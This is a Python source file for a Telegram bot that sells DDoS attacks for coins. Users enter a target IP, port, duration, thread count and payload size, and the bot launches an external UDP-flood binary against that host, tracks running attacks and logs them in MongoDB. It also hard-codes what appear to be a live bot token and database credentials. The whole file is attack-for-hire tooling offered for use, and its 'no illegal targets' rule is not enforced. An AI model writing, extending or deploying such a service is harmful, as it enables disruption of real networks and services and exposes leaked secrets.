import asyncio
import subprocess
import os
import signal
import ipaddress
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from motor.motor_asyncio import AsyncIOMotorClient
from pymongo.errors import ConnectionFailure, PyMongoError

# ======================
# CONFIGURATION
# ======================
TOKEN = "8144243468:AAGkxy-Gd12EsEosyUR6AYwIm6x44NQoDz8"
ADMIN_ID = 1077368861
MONGO_URI = "mongodb+srv://MasterBhaiyaa:MasterBhaiyaa@master.8aan4.mongodb.net/"
DB_NAME = "master"
COLLECTION_NAME = "users"
MAX_ATTACK_TIME = 300  # 5 minutes
COST_PER_ATTACK = 1
RESTRICTED_PORTS = [17500, 20000, 20001, 20002]
BINARY_PATH = "./MasterBhaiyaa"
DEFAULT_THREADS = 900
DEFAULT_PAYLOAD_SIZE = 24

# ======================
# GLOBAL STATE
# ======================
bot_launch_time = datetime.now()
active_attacks = {}  # Stores (target_ip, target_port) -> PID
user_attack_details = {}  # Stores user_id -> (target_ip, target_port, duration, threads, payload_size)

# ======================
# DATABASE FUNCTIONS
# ======================
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[DB_NAME]
user_db = db[COLLECTION_NAME]

async def get_user_data(user_id):
    try:
        user = await user_db.find_one({"user_id": user_id})
        if user is None:
            print(f"No user found for user_id={user_id}, creating default")
            default_user = {"user_id": user_id, "coins": 0, "attack_history": []}
            await user_db.insert_one(default_user)
            return default_user
        if "coins" not in user:
            print(f"User {user_id} missing 'coins', setting to 0")
            user["coins"] = 0
            await user_db.update_one(
                {"user_id": user_id},
                {"$set": {"coins": 0}},
                upsert=True
            )
        if "attack_history" not in user:
            print(f"User {user_id} missing 'attack_history', setting to []")
            user["attack_history"] = []
            await user_db.update_one(
                {"user_id": user_id},
                {"$set": {"attack_history": []}},
                upsert=True
            )
        return user
    except PyMongoError as e:
        print(f"Database error in get_user_data for user_id={user_id}: {str(e)}")
        raise Exception(f"Database error while retrieving user data: {str(e)}")
    except Exception as e:
        print(f"Unexpected error in get_user_data for user_id={user_id}: {str(e)}")
        raise Exception(f"Unexpected error while retrieving user data: {str(e)}")

async def update_coins(user_id, new_balance):
    try:
        result = await user_db.update_one(
            {"user_id": user_id},
            {"$set": {"coins": new_balance}},
            upsert=True
        )
        print(f"Updated coins for user {user_id}: new balance = {new_balance}, matched = {result.matched_count}, modified = {result.modified_count}")
        return result
    except PyMongoError as e:
        print(f"Database error in update_coins for user_id={user_id}: {str(e)}")
        raise Exception(f"Database error while updating coins: {str(e)}")
    except Exception as e:
        print(f"Unexpected error in update_coins for user_id={user_id}: {str(e)}")
        raise Exception(f"Unexpected error while updating coins: {str(e)}")

async def delete_user(user_id):
    try:
        result = await user_db.delete_one({"user_id": user_id})
        print(f"Deleted user {user_id}: deleted_count = {result.deleted_count}")
        return result
    except PyMongoError as e:
        print(f"Database error in delete_user for user_id={user_id}: {str(e)}")
        raise Exception(f"Database error while deleting user: {str(e)}")
    except Exception as e:
        print(f"Unexpected error in delete_user for user_id={user_id}: {str(e)}")
        raise Exception(f"Unexpected error while deleting user: {str(e)}")

# ======================
# ATTACK FUNCTIONS
# ======================
def run_attack_command_sync(target_ip, target_port, duration, threads, payload_size, action, chat_id, context):
    if action == 1:  # Start attack
        try:
            cmd = [BINARY_PATH, target_ip, str(target_port), str(duration)]
            if threads is not None:
                cmd.append(str(threads))
            if payload_size is not None:
                cmd.append(str(payload_size))
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            active_attacks[(target_ip, target_port)] = process.pid
            try:
                stdout, stderr = process.communicate(timeout=5)
                if stderr:
                    if "EXPIRED" in stderr:
                        asyncio.create_task(context.bot.send_message(
                            chat_id=chat_id,
                            text="*Error: Attack binary has expired. Contact @MasterBhaiyaa.*",
                            parse_mode='Markdown'
                        ))
                    else:
                        asyncio.create_task(context.bot.send_message(
                            chat_id=chat_id,
                            text=f"*Attack error: {stderr}*",
                            parse_mode='Markdown'
                        ))
                    active_attacks.pop((target_ip, target_port), None)
            except subprocess.TimeoutExpired:
                pass  # Process is running in the background
            except Exception as e:
                print(f"Failed to start attack: {e}")
                asyncio.create_task(context.bot.send_message(
                    chat_id=chat_id,
                    text="*Error starting attack.*",
                    parse_mode='Markdown'
                ))
        except FileNotFoundError:
            asyncio.create_task(context.bot.send_message(
                chat_id=chat_id,
                text="*Error: Attack binary not found.*",
                parse_mode='Markdown'
            ))
        except Exception as e:
            print(f"Failed to start attack: {e}")
            asyncio.create_task(context.bot.send_message(
                chat_id=chat_id,
                text="*Error starting attack.*",
                parse_mode='Markdown'
            ))
    elif action == 2:  # Stop attack
        pid = active_attacks.pop((target_ip, target_port), None)
        if pid:
            try:
                os.kill(pid, signal.SIGINT)
                asyncio.create_task(context.bot.send_message(
                    chat_id=chat_id,
                    text=f"*Attack stopped for Host: {target_ip} and Port: {target_port}*",
                    parse_mode='Markdown'
                ))
            except ProcessLookupError:
                print(f"Process with PID {pid} not found")
            except Exception as e:
                print(f"Failed to stop process with PID {pid}: {e}")
                asyncio.create_task(context.bot.send_message(
                    chat_id=chat_id,
                    text="*Error stopping attack.*",
                    parse_mode='Markdown'
                ))

# ======================
# HELPER FUNCTIONS
# ======================
async def send_main_buttons(chat_id, context):
    try:
        keyboard = [
            [KeyboardButton("ATTACK"), KeyboardButton("Start Attack 🚀")],
            [KeyboardButton("Stop Attack")]
        ]
        markup = ReplyKeyboardMarkup(
            keyboard,
            resize_keyboard=True,
            one_time_keyboard=True
        )
        await context.bot.send_message(
            chat_id=chat_id,
            text="*Choose an action:*",
            reply_markup=markup,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"Error in send_main_buttons: {str(e)}")
        await context.bot.send_message(
            chat_id=chat_id,
            text="*Error displaying buttons. Contact @MasterBhaiyaa.*",
            parse_mode='Markdown'
        )

async def check_user_approval(user_id):
    try:
        user_data = await get_user_data(user_id)
        if user_data and user_data.get('coins', 0) >= COST_PER_ATTACK:
            return True
        return False
    except Exception as e:
        print(f"Error in check_user_approval: {str(e)}")
        return False

async def send_not_approved_message(chat_id, context):
    await context.bot.send_message(
        chat_id=chat_id,
        text="*YOU ARE NOT APPROVED OR INSUFFICIENT COINS*",
        parse_mode='Markdown'
    )

# ======================
# COMMAND HANDLERS
# ======================
async def start_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_msg = """
    🌟 *WELCOME TO MASTERBHAIYA DDOS BOT* 🌟
    
    🔥 *Yeh bot apko deta hai hacking ke maidan mein asli mazza!* 🔥
    
    ✨ *Key Features:*
    • One-click attack system
    • Powerful UDP flood methods
    • Real-time attack control
    • Coin-based premium service
    
    ⚠️ *Rules:*
    • No illegal targets
    • Max 300s attack duration
    • Restricted ports blocked
    
    💎 *Admin:* @MasterBhaiyaa
    """
    await update.message.reply_text(
        text=welcome_msg,
        parse_mode='Markdown'
    )
    await send_main_buttons(update.effective_chat.id, context)

async def process_attack_ip_port(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if user_id not in user_attack_details or user_attack_details[user_id] is not True:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*Please use the ATTACK button to initiate an attack first.*",
            parse_mode='Markdown'
        )
        return

    try:
        args = update.message.text.strip().split()
        if len(args) < 3 or len(args) > 5:
            await context.bot.send_message(
                chat_id=chat_id,
                text="*Invalid format. Use: <IP> <port> <time> [threads] [payload_size]*\nExample: 192.168.1.1 8080 120",
                parse_mode='Markdown'
            )
            return

        target_ip = args[0]
        try:
            target_port = int(args[1])
        except ValueError:
            await context.bot.send_message(
                chat_id=chat_id,
                text="*Invalid port: Must be a number.*",
                parse_mode='Markdown'
            )
            return

        try:
            duration = int(args[2])
        except ValueError:
            await context.bot.send_message(
                chat_id=chat_id,
                text="*Invalid time: Must be a number.*",
                parse_mode='Markdown'
            )
            return

        threads = None
        payload_size = None
        if len(args) >= 4:
            try:
                threads = int(args[3])
            except ValueError:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="*Invalid threads: Must be a number.*",
                    parse_mode='Markdown'
                )
                return
        if len(args) == 5:
            try:
                payload_size = int(args[4])
            except ValueError:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="*Invalid payload_size: Must be a number.*",
                    parse_mode='Markdown'
                )
                return

        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            await context.bot.send_message(
                chat_id=chat_id,
                text="*Invalid IP address: Use a valid IPv4 or IPv6 address.*",
                parse_mode='Markdown'
            )
            return

        if target_port in RESTRICTED_PORTS or (100 <= target_port <= 999):
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*Port {target_port} is blocked.*",
                parse_mode='Markdown'
            )
            return

        if duration <= 0 or duration > MAX_ATTACK_TIME:
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*Time must be between 1 and {MAX_ATTACK_TIME} seconds.*",
                parse_mode='Markdown'
            )
            return

        if (threads is not None and threads <= 0) or (payload_size is not None and payload_size <= 0):
            await context.bot.send_message(
                chat_id=chat_id,
                text="*Threads and payload_size must be positive.*",
                parse_mode='Markdown'
            )
            return

        user = await get_user_data(user_id)
        if user.get('coins', 0) < COST_PER_ATTACK:
            await context.bot.send_message(
                chat_id=chat_id,
                text="*Insufficient coins! Contact @MasterBhaiyaa*",
                parse_mode='Markdown'
            )
            return

        user_attack_details[user_id] = (target_ip, target_port, duration, threads, payload_size)
        await send_main_buttons(chat_id, context)

    except Exception as e:
        print(f"Error in process_attack_ip_port: {str(e)}")
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*Error processing attack parameters: {str(e)}*",
            parse_mode='Markdown'
        )

async def attack_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if not await check_user_approval(user_id):
        await send_not_approved_message(chat_id, context)
        return

    user_attack_details[user_id] = True
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            "*Please provide target IP, port, time (seconds), and optional threads and payload size (bytes) separated by spaces.*\n"
            "Example: `192.168.1.1 8080 120 [threads] [payload_size]`\n"
            f"Restrictions: Ports {', '.join(map(str, RESTRICTED_PORTS))} blocked, max time {MAX_ATTACK_TIME}s"
        ),
        parse_mode='Markdown'
    )

async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    attack_details = user_attack_details.get(user_id)
    if attack_details is True or not attack_details:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*No attack parameters set. Use ATTACK button.*",
            parse_mode='Markdown'
        )
        return

    target_ip, target_port, duration, threads, payload_size = attack_details

    if active_attacks:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*Another attack is already in progress!*",
            parse_mode='Markdown'
        )
        return

    try:
        user = await get_user_data(user_id)
        new_balance = user.get('coins', 0) - COST_PER_ATTACK
        if new_balance < 0:
            await context.bot.send_message(
                chat_id=chat_id,
                text="*Insufficient coins! Contact @MasterBhaiyaa*",
                parse_mode='Markdown'
            )
            return
        await update_coins(user_id, new_balance)

        # Log attack in user history
        attack_record = {
            "timestamp": datetime.now().isoformat(),
            "target_ip": target_ip,
            "target_port": target_port,
            "duration": duration,
            "threads": threads if threads is not None else DEFAULT_THREADS,
            "payload_size": payload_size if payload_size is not None else DEFAULT_PAYLOAD_SIZE
        }
        await user_db.update_one(
            {"user_id": user_id},
            {"$push": {"attack_history": attack_record}},
            upsert=True
        )
    except Exception as e:
        print(f"Error in start_attack during coin deduction or history update: {str(e)}")
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*Error deducting coins or logging attack: {str(e)}. Contact @MasterBhaiyaa*",
            parse_mode='Markdown'
        )
        return

    run_attack_command_sync(target_ip, target_port, duration, threads, payload_size, 1, chat_id, context)
    threads_display = threads if threads is not None else DEFAULT_THREADS
    payload_display = payload_size if payload_size is not None else DEFAULT_PAYLOAD_SIZE
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*Attack started 💥*\n\n"
            f"Host: `{target_ip}`\n"
            f"Port: `{target_port}`\n"
            f"Time: `{duration}s`\n"
            f"Threads: `{threads_display}`\n"
            f"Payload: `{payload_display}` bytes\n"
            f"New Balance: `{new_balance}` coins"
        ),
        parse_mode='Markdown'
    )

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    attack_details = user_attack_details.get(user_id)
    if attack_details is True or not attack_details:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*No active attack found to stop.*",
            parse_mode='Markdown'
        )
        return

    target_ip, target_port, _, _, _ = attack_details
    if (target_ip, target_port) in active_attacks:
        if user_id == ADMIN_ID or user_id in user_attack_details:
            run_attack_command_sync(target_ip, target_port, 0, None, None, 2, chat_id, context)
            user_attack_details.pop(user_id, None)
        else:
            await context.bot.send_message(
                chat_id=chat_id,
                text="*Only the attacker or admin can stop the attack!*",
                parse_mode='Markdown'
            )
    else:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*No active attack found to stop.*",
            parse_mode='Markdown'
        )

# ======================
# ADMIN COMMANDS
# ======================
async def admin_tools(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(
            "🚫 *MASTERBHAIYA ADMIN ONLY!*",
            parse_mode='Markdown'
        )
        return

    args = context.args
    if not args or len(args) < 1:
        await update.message.reply_text(
            "⚡ *MASTERBHAIYA ADMIN TOOLS*\n\n"
            "Usage: /admin <action> [user_id] [amount]\n"
            "Actions:\n"
            "• add <user_id> <amount> - Add coins\n"
            "• remove <user_id> <amount> - Remove coins\n"
            "• set <user_id> <amount> - Set coins\n"
            "• reset <user_id> - Reset coins to 0\n"
            "• delete <user_id> - Delete user\n"
            "• status <user_id> - Check user status\n"
            "Example: /admin add 123456 10",
            parse_mode='Markdown'
        )
        return

    action = args[0].lower()
    user_id_str = args[1] if len(args) > 1 else None
    amount_str = args[2] if len(args) > 2 else None

    try:
        # Validate user_id for actions requiring it
        if action in ['add', 'remove', 'set', 'reset', 'delete', 'status']:
            if not user_id_str:
                await update.message.reply_text(
                    "User ID is required for this action.",
                    parse_mode='Markdown'
                )
                return
            try:
                user_id = int(user_id_str)
            except ValueError:
                await update.message.reply_text(
                    "Invalid user ID. Must be a number.",
                    parse_mode='Markdown'
                )
                return

        # Validate amount for actions requiring it
        if action in ['add', 'remove', 'set']:
            if not amount_str:
                await update.message.reply_text(
                    "Amount is required for this action.",
                    parse_mode='Markdown'
                )
                return
            try:
                amount = int(amount_str)
                if amount < 0:
                    await update.message.reply_text(
                        "Amount must be non-negative.",
                        parse_mode='Markdown'
                    )
                    return
            except ValueError:
                await update.message.reply_text(
                    "Invalid amount. Must be a number.",
                    parse_mode='Markdown'
                )
                return

        if action in ['add', 'remove', 'set']:
            user = await get_user_data(user_id)
            coins = user.get('coins', 0)

        if action == 'add':
            new_balance = coins + amount
            await update_coins(user_id, new_balance)
            await update.message.reply_text(
                f"✅ *MASTERBHAIYA COINS ADDED*\n\n"
                f"User: {user_id}\n"
                f"Added: {amount} coins\n"
                f"New Balance: {new_balance}",
                parse_mode='Markdown'
            )
        elif action == 'remove':
            new_balance = max(0, coins - amount)
            await update_coins(user_id, new_balance)
            await update.message.reply_text(
                f"✅ *MASTERBHAIYA COINS REMOVED*\n\n"
                f"User: {user_id}\n"
                f"Removed: {amount} coins\n"
                f"New Balance: {new_balance}",
                parse_mode='Markdown'
            )
        elif action == 'set':
            await update_coins(user_id, amount)
            await update.message.reply_text(
                f"✅ *MASTERBHAIYA COINS SET*\n\n"
                f"User: {user_id}\n"
                f"New Balance: {amount} coins",
                parse_mode='Markdown'
            )
        elif action == 'reset':
            await update_coins(user_id, 0)
            await update.message.reply_text(
                f"✅ *MASTERBHAIYA COINS RESET*\n\n"
                f"User: {user_id}\n"
                f"New Balance: 0 coins",
                parse_mode='Markdown'
            )
        elif action == 'delete':
            result = await delete_user(user_id)
            if result.deleted_count == 0:
                await update.message.reply_text(
                    f"❌ No user found with ID {user_id}.",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text(
                    f"✅ *MASTERBHAIYA USER DELETED*\n\n"
                    f"User: {user_id}",
                    parse_mode='Markdown'
                )
        elif action == 'status':
            user = await get_user_data(user_id)
            history = user.get('attack_history', [])
            history_summary = "\n".join(
                f"• {h['timestamp']}: {h['target_ip']}:{h['target_port']} for {h['duration']}s"
                for h in history[-5:]  # Last 5 attacks
            ) if history else "No attacks recorded."
            await update.message.reply_text(
                f"📊 *MASTERBHAIYA USER STATUS*\n\n"
                f"User: {user_id}\n"
                f"Coins: {user.get('coins', 0)}\n"
                f"Attack History (Last 5):\n{history_summary}",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                "Invalid action! Use add, remove, set, reset, delete, or status.",
                parse_mode='Markdown'
            )

    except PyMongoError as e:
        print(f"Database error in admin_tools: {str(e)}")
        await update.message.reply_text(
            f"❌ Database error: {str(e)}. Contact @MasterBhaiyaa",
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"Unexpected error in admin_tools: {str(e)}")
        await update.message.reply_text(
            f"❌ Unexpected error: {str(e)}. Try again or contact @MasterBhaiyaa",
            parse_mode='Markdown'
        )

async def user_management(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(
            "🚫 *MASTERBHAIYA ADMIN ONLY!*",
            parse_mode='Markdown'
        )
        return

    try:
        users = await user_db.find().to_list(length=100)
        if not users:
            await update.message.reply_text(
                "No users found",
                parse_mode='Markdown'
            )
            return

        message = "👥 *MASTERBHAIYA USER LIST*\n\n"
        for user in users:
            message += f"🆔 ID: `{user['user_id']}` | 💎 Coins: `{user.get('coins', 0)}`\n"

        await update.message.reply_text(
            text=message,
            parse_mode='Markdown'
        )

    except PyMongoError as e:
        print(f"Database error in user_management: {str(e)}")
        await update.message.reply_text(
            f"❌ Database error: {str(e)}. Contact @MasterBhaiyaa",
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"Unexpected error in user_management: {str(e)}")
        await update.message.reply_text(
            f"❌ Unexpected error: {str(e)}. Try again or contact @MasterBhaiyaa",
            parse_mode='Markdown'
        )

# ======================
# USER COMMANDS
# ======================
async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = await get_user_data(update.effective_user.id)
        await update.message.reply_text(
            text=(
                "📊 *MASTERBHAIYA USER INFO*\n\n"
                f"🆔 Your ID: `{user['user_id']}`\n"
                f"💎 Coins: `{user.get('coins', 0)}`\n"
                f"🔰 Status: `PREMIUM USER`\n\n"
                "_💎 Want more coins? Contact @MasterBhaiyaa_"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"Error in user_info: {str(e)}")
        await update.message.reply_text(
            text=f"❌ Error retrieving user info: {str(e)}. Contact @MasterBhaiyaa",
            parse_mode='Markdown'
        )

async def bot_uptime(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uptime = datetime.now() - bot_launch_time
        days = uptime.days
        hours, remainder = divmod(uptime.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)

        await update.message.reply_text(
            text=(
                "⏰ *MASTERBHAIYA BOT UPTIME*\n\n"
                f"• Days: `{days}`\n"
                f"• Hours: `{hours}`\n"
                f"• Minutes: `{minutes}`\n"
                f"• Seconds: `{seconds}`\n\n"
                "_🔥 24/7 Powerful DDOS Service_"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"Error in bot_uptime: {str(e)}")
        await update.message.reply_text(
            text=f"❌ Error calculating uptime: {str(e)}. Contact @MasterBhaiyaa",
            parse_mode='Markdown'
        )

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        help_text = """
        🆘 *MASTERBHAIYA HELP MENU*

        *Main Commands:*
        /start - Launch bot
        /myinfo - Check your balance
        /help - This menu
        /uptime - Check bot uptime

        *Attack Instructions:*
        1. Click 'ATTACK' button
        2. Enter IP PORT TIME [threads] [payload_size]
        3. Click 'Start Attack 🚀'

        ⚠️ *Restrictions:*
        • Ports: 17500, 20000-20002 blocked
        • Max attack time: 300s
        • Cost per attack: 1 coin

        💎 *Admin Contact:* @MasterBhaiyaa
        """
        await update.message.reply_text(
            text=help_text,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"Error in show_help: {str(e)}")
        await update.message.reply_text(
            text=f"❌ Error displaying help: {str(e)}. Contact @MasterBhaiyaa",
            parse_mode='Markdown'
        )

# ======================
# BOT SETUP
# ======================
def main():
    try:
        mongo_client.server_info()
        print("MongoDB connection successful")
    except ConnectionFailure as e:
        print(f"Failed to connect to MongoDB: {str(e)}")
        return

    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start_bot))
    app.add_handler(CommandHandler("myinfo", user_info))
    app.add_handler(CommandHandler("uptime", bot_uptime))
    app.add_handler(CommandHandler("help", show_help))
    app.add_handler(CommandHandler("admin", admin_tools))
    app.add_handler(CommandHandler("users", user_management))
    app.add_handler(MessageHandler(filters.Regex('^ATTACK$'), attack_button))
    app.add_handler(MessageHandler(filters.Regex('^Start Attack 🚀$'), start_attack))
    app.add_handler(MessageHandler(filters.Regex('^Stop Attack$'), stop_attack))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex('^(ATTACK|Start Attack 🚀|Stop Attack)$'), process_attack_ip_port))

    print("MasterBhaiyaa Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()